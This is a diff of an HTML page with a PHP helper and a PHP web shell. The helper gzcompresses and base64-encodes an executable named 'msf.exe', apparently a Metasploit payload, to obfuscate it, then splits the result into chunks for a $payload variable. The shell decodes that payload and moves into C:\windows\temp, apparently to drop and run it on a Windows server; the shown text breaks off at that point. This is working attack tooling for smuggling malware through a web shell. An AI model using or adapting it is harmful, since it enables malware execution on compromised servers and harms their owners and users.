@@ -6,16 +6,30 @@
 </head><body>Unless doing it elsewhere, drop into a php interactive console (php -a) or copy into 'assist.php' and then gzdeflate the data. <br/>
 If you change the encoding scheme, make sure you update the execution in the shell below.<br/>
 <br/>
-php -a<br/>
+php helper script. It will encode/compress an exe, decode/decompress for comparison. <br/>
 &lt;?php<br/>
 <br/>
 $file = file_get_contents("msf.exe");<br/>
-$b64 = base64_encode($file);<br/>
-$final = fopen("b64out.txt",'wb');<br/>
-fwrite($final,$b64);<br/>
+$obfuscate = base64_encode(gzcompress($file));<br/>
+$final = fopen("gzb64out.txt",'wb');<br/>
+fwrite($final,$obfuscate);<br/>
 fclose($final);<br/>
 <br/>
+$parts = str_split($obfuscate, 100);<br/>
+print '$payload = "";' . "\n";<br/>
+foreach($parts as &amp;$value){<br/>
+&nbsp; &nbsp; print '$payload .= "' . $value . '";' . "\n";<br/>
+};<br/>
+<br/>
+$file = file_get_contents("gzb64out.txt");<br/>
+$result = gzuncompress(base64_decode($file));<br/>
+$wr = fopen("out.exe",'wb');<br/>
+fwrite($wr,$result);<br/>
+fclose($wr);<br/>
+<br/>
 ?&gt;<br/>
+<br/>
+<br/>
 <br/>
 Now copy and paste the base64 output into the shell below in the $payload variable:<br/>
 <br/>
@@ -24,7 +38,7 @@ Now copy and paste the base64 output into the shell below in the $payload variab
 header('Content-type: text/plain');<br/>
 //<br/>
 $payload = "";<br/>
-$evalCode = gzinflate(base64_decode($payload));<br/>
+$evalCode = gzuncompress(base64_decode($payload));<br/>
 $tmpdir ="C:\\windows\\temp";<br/>
 chdir($tmpdir);<br/>
 $res .= "Using dir : ".$tmpdir;<br/>
